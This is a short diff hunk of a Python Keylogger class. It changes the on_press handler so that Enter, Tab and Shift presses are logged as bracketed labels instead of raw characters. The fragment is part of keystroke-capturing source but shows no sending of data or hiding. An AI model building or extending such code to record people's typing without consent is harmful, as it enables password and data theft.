@@ -55,13 +55,13 @@ class Keylogger:
     def on_press(self, key):
 
         if key == keyboard.Key.enter:
-            self.text += "\n"
+            self.text += "[ENTER]"
         elif key == keyboard.Key.tab:
-            self.text += "\t"
+            self.text += "[TAB]"
         elif key == keyboard.Key.space:
             self.text += " "
         elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
-            pass
+            self.text += "[SHIFT]+"
         elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
             self.text += "[CTRL]+"
         elif key == keyboard.Key.alt or key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
